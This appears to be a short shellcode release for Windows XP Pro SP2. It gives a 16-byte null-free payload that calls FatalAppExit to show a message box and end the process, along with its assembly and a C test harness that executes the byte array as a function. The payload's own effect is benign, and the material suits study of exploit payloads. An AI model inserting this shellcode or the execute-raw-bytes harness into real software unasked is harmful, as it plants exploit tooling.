+-----------------------------------------------------+
| Windows XP Pro Sp2 English "Message-Box" Shellcode. |
+-----------------------------------------------------+

Size         : 16 Bytes, Null-Free.
Author       : Aodrulez. 
Email        : f3arm3d3ar@gmail.com


Shellcode = "\xB9\x38\xDD\x82\x7C\x33\xC0\xBB"
            "\xD8\x0A\x86\x7C\x51\x50\xFF\xd3";


+--------------+
| Description: |
+--------------+

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

I've used a Function called "FatalAppExit".
The Benefits are Three-Fold!

1] Displays a MessageBox.
2] Terminates the Process. 
3] Its there in Kernel32.dll itself.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

+-----------+
| Asm Code: |
+-----------+

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

shellcode:
 	      mov ecx,7c82dd38h ;"Admin" string in mem
 	      xor eax,eax
 	      mov ebx,7c860ad8h ;Addr of "FatalAppExit()" 
 		push ecx          ;function from Kernel32
 		push eax          
 		call ebx          ;App does a Clean Exit.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


+-----------------+
| Shellcodetest.c |
+-----------------+

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

char code[] = "\xB9\x38\xDD\x82\x7C\x33\xC0\xBB"
              "\xD8\x0A\x86\x7C\x51\x50\xFF\xd3";


int main(int argc, char **argv)
{
  int (*func)();
  func = (int (*)()) code;
  (int)(*func)();
}

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


+-------------------+
| Greetz Fly Out To |
+-------------------+

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

1] Amforked()	 : My Mentor.
2] The Blue Genius : My Boss.
3] www.orchidseven.com
4] str0ke

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

+---------------------------------------------+
| Forgive, O Lord, My Little Jokes on Thee,   |
| and I'll Forgive Thy Great Big Joke on Me.  |
+---------------------------------------------+